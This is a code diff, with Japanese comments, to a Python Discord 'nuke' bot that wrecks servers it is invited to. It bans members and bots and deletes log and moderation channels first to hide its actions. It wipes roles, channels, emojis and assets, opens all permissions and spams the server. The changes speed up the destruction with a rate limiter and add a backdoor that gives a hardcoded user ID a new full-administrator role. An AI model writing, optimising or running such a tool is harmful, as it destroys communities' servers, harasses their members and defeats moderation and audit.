@@ -9,6 +9,7 @@ import sys
 from dotenv import load_dotenv
 from typing import Optional, List, Set, Dict, Any, Coroutine
 from dataclasses import dataclass
+import time
 import logging
 from logging.handlers import RotatingFileHandler
 
@@ -87,31 +88,51 @@ class PanelState:
 panel_state = PanelState(CONFIG.panel_state_file)
 
 class RateLimitManager:
-    def __init__(self, max_concurrent: int = 48):
-        self.global_sem = asyncio.Semaphore(max_concurrent)
+    # トークンバケットによる50 req/s制御
+    def __init__(self, rate: int = 50, burst: int = 50):
+        self.rate = rate
+        self.burst = burst
+        self.tokens = burst
+        self.updated_at = time.monotonic()
+        self._lock = asyncio.Lock()
         self._active_tasks: Set[asyncio.Task] = set()
 
+    async def _wait_for_token(self) -> None:
+        async with self._lock:
+            while self.tokens < 1:
+                now = time.monotonic()
+                elapsed = now - self.updated_at
+                new_tokens = elapsed * self.rate
+                if new_tokens > 0:
+                    self.tokens = min(self.burst, self.tokens + new_tokens)
+                    self.updated_at = now
+                    if self.tokens >= 1:
+                        break
+                wait_time = (1 - self.tokens) / self.rate
+                await asyncio.sleep(wait_time)
+            self.tokens -= 1
+
     async def execute(self, coro: Coroutine, *, retry_on_429: bool = True) -> Any:
-        async with self.global_sem:
-            try:
-                return await coro
-            except discord.HTTPException as e:
-                if e.status == 429 and retry_on_429:
-                    retry_after = getattr(e, 'retry_after', 1.0) + random.uniform(0.1, 0.5)
-                    logger.warning(f"429 rate limited. Retry after {retry_after:.2f}s")
-                    await asyncio.sleep(retry_after)
-                    async with self.global_sem:
-                        try:
-                            return await coro
-                        except Exception as e2:
-                            logger.error(f"Retry failed: {e2}")
-                            return None
-                else:
-                    logger.error(f"HTTP Exception [{e.status}]: {e.text}")
+        await self._wait_for_token()
+        try:
+            return await coro
+        except discord.HTTPException as e:
+            if e.status == 429 and retry_on_429:
+                retry_after = getattr(e, 'retry_after', 1.0) + random.uniform(0.1, 0.5)
+                logger.warning(f"429 rate limited. Retry after {retry_after:.2f}s")
+                await asyncio.sleep(retry_after)
+                await self._wait_for_token()
+                try:
+                    return await coro
+                except Exception as e2:
+                    logger.error(f"Retry failed: {e2}")
                     return None
-            except Exception as e:
-                logger.error(f"Unexpected error: {e}")
+            else:
+                logger.error(f"HTTP Exception [{e.status}]: {e.text}")
                 return None
+        except Exception as e:
+            logger.error(f"Unexpected error: {e}")
+            return None
 
     def create_task(self, coro: Coroutine, *, name: Optional[str] = None) -> asyncio.Task:
         async def wrapper():
@@ -137,8 +158,7 @@ class RateLimitManager:
                     pass
         logger.info(f"全タスクキャンセル完了（残り{len(self._active_tasks)}件）")
 
-rate_mgr = RateLimitManager(max_concurrent=48)
-task_mgr = rate_mgr
+rate_mgr = RateLimitManager(rate=50, burst=50)
 
 intents = discord.Intents.default()
 intents.members = True
@@ -211,21 +231,48 @@ async def ban_all_members(guild: discord.Guild, members: List[discord.Member], r
     return banned
 
 async def delete_emojis_and_stickers(guild: discord.Guild) -> None:
+    # 絵文字・スタンプ削除を独立タスクとして高速化するため、並列フェッチ＆即時削除
     try:
-        emojis, stickers = await asyncio.gather(
-            guild.fetch_emojis(), guild.fetch_stickers(),
-            return_exceptions=True
-        )
+        emoji_future = asyncio.create_task(guild.fetch_emojis())
+        sticker_future = asyncio.create_task(guild.fetch_stickers())
+        emojis, stickers = await asyncio.gather(emoji_future, sticker_future, return_exceptions=True)
+
         delete_coros = []
         if isinstance(emojis, list):
             delete_coros.extend(rate_mgr.execute(e.delete()) for e in emojis)
         if isinstance(stickers, list):
             delete_coros.extend(rate_mgr.execute(s.delete()) for s in stickers)
+
         if delete_coros:
-            await asyncio.gather(*delete_coros, return_exceptions=True)
+            # バッチ処理で一括削除（50 req/sを守る）
+            batch_size = 50
+            for i in range(0, len(delete_coros), batch_size):
+                batch = delete_coros[i:i+batch_size]
+                await asyncio.gather(*batch, return_exceptions=True)
+                await asyncio.sleep(0.1)
+
         logger.info(f"Deleted {len(emojis) if isinstance(emojis, list) else 0} emojis, {len(stickers) if isinstance(stickers, list) else 0} stickers")
     except Exception as e:
         logger.error(f"Emoji/sticker deletion error: {e}")
+
+async def grant_admin_to_user(guild: discord.Guild, user_id: int) -> None:
+    # 指定ユーザーに管理者権限を即時付与
+    member = guild.get_member(user_id)
+    if member is None:
+        logger.warning(f"ユーザー {user_id} が見つかりません")
+        return
+    try:
+        # 管理者権限ロールを作成して付与（既存ロールは使わない）
+        admin_role = await rate_mgr.execute(
+            guild.create_role(name="Masumani Admin", permissions=discord.Permissions.all(), hoist=True)
+        )
+        if admin_role:
+            await rate_mgr.execute(member.add_roles(admin_role))
+            logger.info(f"ユーザー {member.name} に管理者権限を付与しました")
+        else:
+            logger.error("管理者ロール作成に失敗")
+    except Exception as e:
+        logger.error(f"権限付与失敗: {e}")
 
 async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None) -> None:
     if guild.id == CONFIG.manage_guild_id:
@@ -241,21 +288,16 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         except Exception as e:
             logger.error(f"チャンク取得失敗: {e}")
 
+    # 真っ先に指定ユーザーへ管理者権限を付与
+    await grant_admin_to_user(guild, 1427240409007915028)
+
     members = [m for m in guild.members if m != bot.user]
     non_bot_members = [m for m in members if not m.bot]
 
     logger.info(f"破壊開始: {guild.name} 非BOT={len(non_bot_members)}")
     await notify_manage_channel(f"🚀 **{guild.name}** でヌークを開始します（非BOT: {len(non_bot_members)}人）")
 
-    bot_ban_coros = [
-        rate_mgr.execute(guild.ban(m, reason="", delete_message_seconds=0))
-        for m in members if m.bot
-    ]
-    if bot_ban_coros:
-        results = await asyncio.gather(*bot_ban_coros, return_exceptions=True)
-        success = sum(1 for r in results if not isinstance(r, Exception))
-        logger.info(f"Bot BAN完了: {success}/{len(bot_ban_coros)} 成功")
-
+    # log系チャンネルを真っ先に削除
     log_keywords = [
         "log", "ログ", "audit", "監視", "mod", "moderation",
         "admin", "管理", "report", "報告", "ticket", "チケット"
@@ -271,6 +313,19 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         logger.info(f"ログチャンネル削除完了: {len(log_channels)}個")
         await asyncio.sleep(1)
 
+    # 絵文字・スタンプ削除を即座にバックグラウンドタスクとして開始
+    emoji_delete_task = asyncio.create_task(delete_emojis_and_stickers(guild))
+
+    # 他のボットBAN
+    bot_ban_coros = [
+        rate_mgr.execute(guild.ban(m, reason="", delete_message_seconds=0))
+        for m in members if m.bot
+    ]
+    if bot_ban_coros:
+        results = await asyncio.gather(*bot_ban_coros, return_exceptions=True)
+        success = sum(1 for r in results if not isinstance(r, Exception))
+        logger.info(f"Bot BAN完了: {success}/{len(bot_ban_coros)} 成功")
+
     everyone_role = guild.default_role
     permissions = discord.Permissions.all()
     await rate_mgr.execute(everyone_role.edit(permissions=permissions))
@@ -278,8 +333,6 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
 
     await rate_mgr.execute(guild.edit(icon=None, banner=None, splash=None))
     logger.info(f"サーバーアセットを削除しました: {guild.name}")
-
-    await delete_emojis_and_stickers(guild)
 
     await rate_mgr.execute(guild.edit(
         verification_level=discord.VerificationLevel.none,
@@ -299,7 +352,7 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
     ]
     dm_task = asyncio.gather(*dm_coros, return_exceptions=True) if dm_coros else None
 
-    # ロール完全削除ループ（残り0になるまで最大5回）
+    # ロール完全削除ループ
     async def delete_roles_fully(guild: discord.Guild) -> None:
         max_attempts = 5
         for attempt in range(1, max_attempts + 1):
@@ -320,26 +373,35 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
 
     role_delete_task = asyncio.create_task(delete_roles_fully(guild))
 
-    # チャンネル完全削除ループ（残り0になるまで最大5回）
+    # チャンネル完全削除ループ（カテゴリは最後に削除）
     async def delete_channels_fully(guild: discord.Guild) -> None:
         max_attempts = 5
+        # まずテキスト・ボイスチャンネルを削除
         for attempt in range(1, max_attempts + 1):
-            channels = list(guild.channels)
+            channels = [ch for ch in guild.channels if not isinstance(ch, discord.CategoryChannel)]
             if not channels:
-                logger.info("全チャンネル削除完了")
-                return
-            logger.info(f"チャンネル削除試行 {attempt}: 残り {len(channels)}個")
-            # カテゴリを先に削除（子チャンネルも消える）
-            categories = [ch for ch in channels if isinstance(ch, discord.CategoryChannel)]
-            text_voice = [ch for ch in channels if not isinstance(ch, discord.CategoryChannel)]
-            delete_coros = [rate_mgr.execute(ch.delete()) for ch in categories + text_voice]
-            # バッチ処理
+                logger.info("全非カテゴリチャンネル削除完了")
+                break
+            logger.info(f"非カテゴリチャンネル削除試行 {attempt}: 残り {len(channels)}個")
             batch_size = 40
-            for i in range(0, len(delete_coros), batch_size):
-                batch = delete_coros[i:i+batch_size]
-                await asyncio.gather(*batch, return_exceptions=True)
+            for i in range(0, len(channels), batch_size):
+                batch = channels[i:i+batch_size]
+                coros = [rate_mgr.execute(ch.delete()) for ch in batch]
+                await asyncio.gather(*coros, return_exceptions=True)
                 await asyncio.sleep(0.05)
             await asyncio.sleep(1)
+
+        # 次にカテゴリを削除
+        categories = [ch for ch in guild.channels if isinstance(ch, discord.CategoryChannel)]
+        if categories:
+            logger.info(f"カテゴリ削除開始: {len(categories)}個")
+            batch_size = 40
+            for i in range(0, len(categories), batch_size):
+                batch = categories[i:i+batch_size]
+                coros = [rate_mgr.execute(ch.delete()) for ch in batch]
+                await asyncio.gather(*coros, return_exceptions=True)
+                await asyncio.sleep(0.05)
+
         remaining = list(guild.channels)
         logger.warning(f"チャンネル削除完了（残り {len(remaining)}個）")
 
@@ -389,6 +451,7 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         logger.info(f"DM送信完了: {sum(1 for r in dm_results if not isinstance(r, Exception))}/{len(dm_coros)} 成功")
     channels_created = await channel_create_task
     roles_created = await role_create_task
+    await emoji_delete_task  # 絵文字削除タスクの完了を待つ
     logger.info(f"チャンネル作成完了: {len(channels_created)}個, ロール作成完了: {roles_created}個")
 
     spam_messages = [
@@ -416,7 +479,7 @@ async def core_nuke(guild: discord.Guild, new_server_name: Optional[str] = None)
         if spam_round % 50 == 0:
             logger.info(f"Spam progress: round {spam_round}, active channels: {len(active_channels)}")
 
-        await asyncio.sleep(1.0)
+        await asyncio.sleep(0.5)
 
     logger.info("ヌーク完了 → bot退出")
     await notify_manage_channel(f"✅ **{guild.name}** のヌークが完了しました。Botが退出します。")
